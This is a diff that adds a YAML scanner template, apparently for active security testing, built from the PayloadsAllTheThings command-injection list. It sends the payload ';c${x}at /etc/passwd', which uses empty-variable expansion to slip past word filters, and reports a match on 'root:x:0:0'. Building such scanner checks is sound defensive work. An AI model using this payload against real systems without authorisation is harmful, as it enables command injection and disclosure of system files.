@@ -1,0 +1,20 @@
+id: patt-cmdi-var-01-exec
+name: 'PATT cmdi patt-cmdi-var-01 via exec'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - patt
+  - filterword
+description: 'PATT Bypass With Variable Expansion: variable empty splits the word cat. [patt:patt-cmdi-var-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      exec:
+        - ';c${x}at /etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
